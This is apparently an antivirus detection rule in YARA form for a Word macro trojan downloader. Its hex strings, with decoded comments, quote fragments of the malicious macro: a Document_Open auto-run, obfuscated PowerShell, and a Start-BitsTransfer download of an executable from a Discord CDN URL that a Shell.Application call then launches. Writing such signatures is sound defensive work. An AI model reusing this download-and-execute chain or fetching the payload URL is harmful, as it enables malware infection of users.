
rule TrojanDownloader_O97M_Obfuse_PHH_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PHH!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,08 00 08 00 08 00 00 "
		
	strings :
		$a_01_0 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 } //1 Private Sub Document_Open()
		$a_01_1 = {3d 20 22 70 6f 77 65 5e 72 73 22 } //1 = "powe^rs"
		$a_01_2 = {6e 65 74 77 6f 72 6b 70 6f 73 69 74 69 76 65 20 3d 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 68 65 61 76 79 73 6f 63 69 61 6c 2e 63 22 20 26 20 43 68 72 28 31 30 39 29 20 26 20 22 64 22 } //1 networkpositive = "C:\Users\Public\Documents\heavysocial.c" & Chr(109) & "d"
		$a_01_3 = {3d 20 22 68 5e 65 6c 6c 22 } //1 = "h^ell"
		$a_01_4 = {2d 77 20 68 69 20 73 6c 65 5e 65 5e 70 20 2d 53 65 20 33 31 3b 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 38 37 39 30 39 34 36 39 36 38 34 33 30 33 38 37 35 33 2f 38 38 39 34 31 30 30 36 39 32 30 37 33 35 31 33 37 36 2f 52 50 2e 65 60 78 65 } //1 -w hi sle^e^p -Se 31;Start-BitsTransfer -Source htt`ps://cdn.discordapp.com/attachments/879094696843038753/889410069207351376/RP.e`xe
		$a_01_5 = {73 68 65 65 65 20 3d 20 22 73 68 65 6c 22 } //1 sheee = "shel"
		$a_01_6 = {43 6c 6f 73 65 20 66 6f 6f 64 70 75 6c 6c } //1 Close foodpull
		$a_01_7 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 73 68 65 65 65 20 26 20 22 6c 2e 61 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e 28 6e 65 74 77 6f 72 6b 70 6f 73 69 74 69 76 65 29 } //1 CreateObject(sheee & "l.application").Open(networkpositive)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1+(#a_01_7  & 1)*1) >=8
 
}